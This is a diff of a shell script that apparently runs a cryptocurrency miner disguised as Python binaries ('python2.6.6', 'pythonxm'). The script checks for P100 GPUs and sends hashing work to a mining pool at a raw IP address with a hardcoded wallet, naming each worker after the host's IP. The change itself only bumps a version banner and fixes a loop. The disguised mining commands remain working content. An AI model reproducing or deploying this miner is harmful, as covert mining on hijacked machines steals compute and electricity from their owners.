@@ -6,7 +6,7 @@ IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
 echo '#######################################################'
-echo '##################### RV v0.0.1 #######################'
+echo '##################### RV v0.0.2 #######################'
 echo '#######################################################'
 
 rm -rf python2.6.6
@@ -41,6 +41,7 @@ nohup ./pythonxm -c config.json 2>> oout 1>> oout &
 if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
     while true
+    do
         nohup ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RV_CU_P100_$IPNAME@116.203.10.54:80  -U 2>> oout 1>> oout &
         tail -f oout
    done
